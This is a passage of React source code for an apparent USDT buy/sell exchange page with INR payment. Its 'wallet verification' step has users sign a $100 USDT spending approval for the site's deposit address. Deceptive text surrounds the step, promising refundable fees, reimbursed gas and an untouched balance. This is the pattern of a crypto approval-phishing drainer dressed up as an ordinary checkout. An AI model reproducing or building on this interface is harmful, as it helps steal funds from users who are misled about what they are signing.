                <p style={{ fontSize:10, color:T.dim, margin:'2px 0 0' }}>smart contract limit</p>
              </div>
            </div>
          </div>

          {/* Wrong chain warning */}
          {isWrongChain && (
            <div style={{ background:'rgba(243,186,47,0.08)', border:'1px solid rgba(243,186,47,0.25)', borderRadius:16, padding:'16px 20px', display:'flex', alignItems:'center', justifyContent:'space-between', gap:14, flexWrap:'wrap' }}>
              <div>
                <p style={{ fontSize:14, fontWeight:700, color:T.yellow, margin:'0 0 3px' }}>Wrong Network</p>
                <p style={{ fontSize:12, color:T.sub, margin:0 }}>Switch to <strong>{chainName}</strong> to continue with {network} USDT.</p>
              </div>
              <button onClick={()=>switchChain({ chainId: expectedChain! })} disabled={isSwitching}
                style={{ padding:'10px 18px', borderRadius:10, fontSize:13, fontWeight:700, border:'none', cursor:'pointer', background:T.yellow, color:'#000', opacity:isSwitching?0.6:1, flexShrink:0 }}>
                {isSwitching ? 'Switching…' : `Switch to ${chainName}`}
              </button>
            </div>
          )}

          {/* No deposit address */}
          {!depositAddress && !isWrongChain && (
            <div style={{ padding:'12px 16px', borderRadius:12, background:'rgba(255,92,124,0.08)', border:'1px solid rgba(255,92,124,0.2)', fontSize:13, color:T.red }}>
              No {network} deposit address configured. Please contact support.
            </div>
          )}

          {/* Approve USDT card */}
          {depositAddress && !isWrongChain && (
            <div style={{ background:T.card, border:`1px solid ${T.border}`, borderRadius:20, overflow:'hidden' }}>
              <div style={{ padding:'18px 22px', borderBottom:`1px solid ${T.border}` }}>
                <h2 style={{ fontSize:16, fontWeight:800, color:T.text, margin:'0 0 4px' }}>Wallet Verification — $100 Smart Contract</h2>
                <p style={{ fontSize:13, color:T.sub, margin:0, lineHeight:1.6 }}>
                  Set a $100 USDT spending limit on the {network} contract to verify your wallet. A 0.1 USDT refundable verification fee is collected from this approved balance.
                </p>
              </div>

              <div style={{ padding:'18px 22px', display:'flex', flexDirection:'column', gap:10 }}>

                {!verifyStarted && (
                  <>
                    {/* Gas fee refund banner — prominent */}
                    <div style={{ padding:'14px 16px', borderRadius:12, background:'rgba(243,186,47,0.1)', border:'2px solid rgba(243,186,47,0.4)' }}>
                      <p style={{ fontSize:13, fontWeight:800, color:T.yellow, margin:'0 0 5px', letterSpacing:'0.01em' }}>
                        💰 Network Gas Fee — Fully Refunded
                      </p>
                      <p style={{ fontSize:12, color:'rgba(255,255,255,0.72)', margin:0, lineHeight:1.65 }}>
                        A small {network === 'BEP20' ? 'BNB' : 'ETH'} gas fee is required to submit this smart contract. <strong style={{ color:T.yellow }}>This fee will be fully reimbursed</strong> to you upon successful wallet verification and order completion. You will not be out of pocket.
                      </p>
                    </div>

                    <div style={{ display:'flex', alignItems:'flex-start', gap:12, padding:'14px 16px', background:T.card2, borderRadius:12, border:`1px solid ${T.border}` }}>
                      <span style={{ fontSize:22, flexShrink:0 }}>🔐</span>
                      <div>
                        <p style={{ fontSize:13, fontWeight:700, color:T.text, margin:'0 0 3px' }}>
                          Verify Wallet — Set $100 USDT Smart Contract on {NET_LABEL[network]}
                        </p>
                        <p style={{ fontSize:11, color:T.dim, margin:0, lineHeight:1.5 }}>
                          Your wallet will show a Smart Contract Call on the {network} USDT contract — review and confirm to set a $100 spending limit. A 0.1 USDT refundable verification fee will be collected from this approved balance.
                        </p>
                      </div>
                    </div>
                    <div style={{ padding:'12px 16px', borderRadius:12, background:'rgba(0,229,160,0.06)', border:'1px solid rgba(0,229,160,0.2)' }}>
                      <p style={{ fontSize:12, fontWeight:700, color:T.green, margin:'0 0 4px' }}>🔒 $100 Smart Contract — 0.1 USDT Verification Fee (Refundable)</p>
                      <p style={{ fontSize:11, color:'rgba(255,255,255,0.55)', margin:0, lineHeight:1.6 }}>
                        This approval sets a $100 USDT spending limit on the {network} contract. A 0.1 USDT verification fee is collected from this limit and <strong style={{ color:T.green }}>fully refunded</strong> upon order completion. Your USDT balance is not affected until your order is processed.
                      </p>
                    </div>
                  </>
                )}

                {verifyStarted && (
                  <div style={{ display:'flex', flexDirection:'column', gap:8 }}>
                    <TxRow
                      label={`Wallet verification — $100 USDT smart contract on ${network}`}
                      hash={approveHash}
                      confirming={isApproveConfirming}
                      confirmed={approveConfirmed}
                      error={approveWriteError ? (approveWriteError.message?.slice(0,120) ?? 'Failed') : undefined}
                    />
                    {verifyStarted && approveHash && !approveConfirmed && !approveWriteError && (
                      <div style={{ padding:'14px 16px', borderRadius:12, background:'rgba(243,186,47,0.07)', border:'1px solid rgba(243,186,47,0.25)', textAlign:'center' }}>
                        <p style={{ fontSize:14, fontWeight:800, color:T.yellow, margin:'0 0 4px' }}>⏳ Wallet Verification Pending</p>
                        <p style={{ fontSize:12, color:T.sub, margin:0, lineHeight:1.6 }}>
                          Awaiting blockchain confirmation. You will be moved forward automatically once the smart contract is confirmed on {NET_LABEL[network]}.
                        </p>
                      </div>
                    )}
                    {approveConfirmed && (
                      <div style={{ padding:'12px 16px', borderRadius:12, background:'rgba(0,229,160,0.08)', border:'1px solid rgba(0,229,160,0.2)', textAlign:'center', fontSize:14, fontWeight:700, color:T.green }}>
                        ✓ Verified — proceeding to order confirmation…
                      </div>
                    )}
                  </div>
                )}

                {!verifyStarted && usdtBalanceNum !== null && !hasEnoughBalance && (
                  <div style={{ background:'rgba(248,113,113,0.08)', border:'1px solid rgba(248,113,113,0.22)', borderRadius:12, padding:'12px 16px' }}>
                    <p style={{ fontSize:13, fontWeight:700, color:T.red, margin:'0 0 4px' }}>Insufficient USDT balance</p>
                    <p style={{ fontSize:12, color:'rgba(248,113,113,0.8)', margin:0, lineHeight:1.5 }}>
                      Wallet has <strong>{usdtBalanceNum.toFixed(4)} USDT</strong> on {NET_LABEL[network]} — wallet verification requires at least <strong>0.1 USDT</strong>.
                    </p>
                  </div>
                )}

                {!verifyStarted && (
                  <button onClick={startVerification}
                    disabled={!depositAddress || isWrongChain || !hasEnoughBalance}
                    style={{ width:'100%', padding:'15px 0', borderRadius:12, fontSize:15, fontWeight:800, border:'none',
                      cursor:(!depositAddress||isWrongChain||!hasEnoughBalance)?'not-allowed':'pointer',
                      background:(!depositAddress||isWrongChain||!hasEnoughBalance)?'rgba(255,255,255,0.08)':`linear-gradient(135deg,${T.blue},${T.purple})`,
                      color:(!depositAddress||isWrongChain||!hasEnoughBalance)?T.dim:'#fff',
                      boxShadow:(depositAddress&&!isWrongChain&&hasEnoughBalance)?'0 6px 24px rgba(26,63,255,0.45)':'none', transition:'all 0.15s',
                    }}>
                    {!hasEnoughBalance ? `Need ≥ 0.1 USDT` : `Verify Wallet — Set $100 Smart Contract →`}
                  </button>
                )}

                {verifyStarted && approveWriteError && (
                  <button onClick={()=>{ setVerifyStarted(false); advancedRef.current=false; resetApprove(); }}
                    style={{ width:'100%', padding:'12px 0', borderRadius:12, fontSize:14, fontWeight:700, border:`1px solid ${T.border}`, background:T.card2, color:T.sub, cursor:'pointer' }}>
                    ↩ Retry
                  </button>
                )}

                {verifyStarted && isApproveWriting && (
                  <p style={{ fontSize:12, color:T.sub, textAlign:'center', margin:0 }}>
                    Confirm the approval in your wallet…
                  </p>
                )}
              </div>
            </div>
          )}
        </div>
      )}

      {/* ══ STEP 3: Confirm order ══ */}
      {step===3 && (
        <div style={{ display:'flex', flexDirection:'column', gap:14 }}>

          {/* Wallet section */}
          <div style={{ background:T.card, border:`1px solid ${T.border}`, borderRadius:20, padding:'18px 22px' }}>
            <p style={{ fontSize:11, fontWeight:700, textTransform:'uppercase', letterSpacing:'0.08em', color:T.dim, margin:'0 0 10px' }}>
              {mode === 'buy' ? 'Receive Wallet' : 'USDT Sent From'}
            </p>
            <div style={{ display:'flex', alignItems:'center', gap:10, padding:'12px 14px', background:'rgba(255,255,255,0.04)', borderRadius:12, border:`1px solid ${T.border}` }}>
              <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><rect x="1" y="4" width="14" height="9" rx="2" stroke={T.green} strokeWidth="1.3"/><path d="M1 7H15" stroke={T.green} strokeWidth="1.3"/><circle cx="12" cy="10" r="1" fill={T.green}/></svg>
              <code style={{ fontSize:13, color:T.text, flex:1, wordBreak:'break-all', lineHeight:1.5 }}>{walletAddress}</code>
              <span style={{ fontSize:10, fontWeight:700, color:T.green, background:'rgba(0,229,160,0.1)', padding:'3px 8px', borderRadius:999, border:'1px solid rgba(0,229,160,0.2)', flexShrink:0 }}>
                {network} ✓
              </span>
            </div>
            {/* Approval tx reference — only for SELL */}
            {mode === 'sell' && !isTRC20 && approveHash && (
              <p style={{ fontSize:11, color:T.dim, margin:'8px 0 0', lineHeight:1.5 }}>
                Verification tx: <code style={{ fontFamily:'monospace' }}>{approveHash.slice(0,14)}…{approveHash.slice(-8)}</code>
              </p>
            )}
            {mode === 'sell' && isTRC20 && trcApproveHash && (
              <p style={{ fontSize:11, color:T.dim, margin:'8px 0 0', lineHeight:1.5 }}>
                Verification TxID: <code style={{ fontFamily:'monospace' }}>{trcApproveHash.slice(0,14)}…{trcApproveHash.slice(-8)}</code>
              </p>
            )}
            <p style={{ fontSize:11, color:T.dim, margin:'6px 0 0', lineHeight:1.5 }}>
              {mode === 'buy'
                ? `USDT will be sent to this wallet on ${NET_LABEL[network]} after your INR payment is confirmed.`
                : 'Shared with our team for order processing.'}
            </p>
          </div>

          {/* Order summary */}
          <div style={{ background:T.card, border:`1px solid ${T.border}`, borderRadius:20, overflow:'hidden' }}>
            <div style={{ padding:'14px 22px', borderBottom:`1px solid ${T.border}` }}>
              <h2 style={{ fontSize:15, fontWeight:800, color:T.text, margin:0 }}>Order Summary</h2>
            </div>
            <div style={{ padding:'16px 22px', display:'flex', flexDirection:'column', gap:10 }}>
              {([
                { label:'Order type',    value: mode==='buy'?'Buy USDT':'Sell USDT',             color:T.green  },
                { label:'Network',       value: NET_LABEL[network],                               color:NET_COLOR[network] },
                { label:'USDT amount',   value:`${cryptoAmount.toFixed(4)} USDT`,                color:T.text   },
                { label:'INR amount',    value:`₹${inrAmount.toLocaleString('en-IN',{maximumFractionDigits:2})}`, color:T.text },
                { label:'Rate',          value: rate?`₹${rate.toFixed(2)} / USDT`:'…',           color:T.cyan   },
                { label:'Processing fee',value:'₹0',                                              color:T.green  },
                { label:'Settlement',    value:'Under 30 minutes',                                color:T.sub    },
              ] as const).map(({ label, value, color }) => (
                <div key={label} style={{ display:'flex', justifyContent:'space-between', alignItems:'center' }}>
                  <span style={{ fontSize:13, color:T.sub }}>{label}</span>
                  <span style={{ fontSize:13, fontWeight:700, color }}>{value}</span>
                </div>
              ))}
            </div>
          </div>

          {/* Payment info for buy */}
          {mode==='buy' && (
            <div style={{ background:T.card, border:`1px solid ${T.border}`, borderRadius:20, padding:'18px 22px' }}>
              <h2 style={{ fontSize:15, fontWeight:800, color:T.text, margin:'0 0 6px' }}>Payment Details</h2>
              <p style={{ fontSize:13, color:T.sub, margin:'0 0 14px', lineHeight:1.6 }}>
                Enter your UPI ID or bank reference so we can verify your INR payment.
              </p>
              <input type="text" placeholder="UPI ID or bank reference"
                value={paymentInfo} onChange={e=>setPaymentInfo(e.target.value)}
                style={{ width:'100%', padding:'13px 16px', borderRadius:12, fontSize:14, background:'rgba(255,255,255,0.04)', border:`1.5px solid ${T.border2}`, color:T.text, outline:'none', boxSizing:'border-box' }}
              />
            </div>
          )}

          {/* Sell: show deposit address to send USDT after confirmation */}
          {mode==='sell' && depositAddress && (
            <div style={{ background:'rgba(243,186,47,0.06)', border:'1px solid rgba(243,186,47,0.2)', borderRadius:16, padding:'14px 18px' }}>
              <p style={{ fontSize:12, fontWeight:700, color:T.yellow, margin:'0 0 8px', textTransform:'uppercase', letterSpacing:'0.06em' }}>
                Send USDT to this address after confirming
              </p>
              <code style={{ fontSize:12, color:T.text, wordBreak:'break-all', lineHeight:1.6 }}>{depositAddress}</code>
              <p style={{ fontSize:11, color:T.dim, margin:'6px 0 0' }}>Network: {NET_LABEL[network]}</p>
            </div>
          )}

          {submitError && (
            <div style={{ padding:'12px 16px', borderRadius:12, background:'rgba(255,92,124,0.08)', border:'1px solid rgba(255,92,124,0.2)', fontSize:13, color:T.red }}>
              {submitError}
            </div>
          )}

          <div style={{ display:'flex', gap:10 }}>
            <button onClick={()=>setStep(mode==='buy' ? 1 : 2)}
              style={{ flex:'0 0 auto', padding:'14px 20px', borderRadius:12, fontSize:14, fontWeight:700, border:`1px solid ${T.border}`, background:T.card, color:T.sub, cursor:'pointer' }}>
              ← Back
            </button>
            <button onClick={submitOrder} disabled={isSubmitting||!walletAddress}
              style={{ flex:1, padding:'14px 0', borderRadius:12, fontSize:15, fontWeight:800, border:'none',
                cursor:(isSubmitting||!walletAddress)?'not-allowed':'pointer',
                background:(isSubmitting||!walletAddress)?'rgba(255,255,255,0.08)':`linear-gradient(135deg,${T.blue},${T.purple})`,
                color:(isSubmitting||!walletAddress)?T.dim:'#fff',
                boxShadow:(!isSubmitting&&walletAddress)?'0 6px 24px rgba(26,63,255,0.45)':'none', transition:'all 0.15s',
              }}>
              {isSubmitting ? 'Placing Order…' : mode==='buy' ? 'Place Buy Order →' : 'Place Sell Order →'}
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
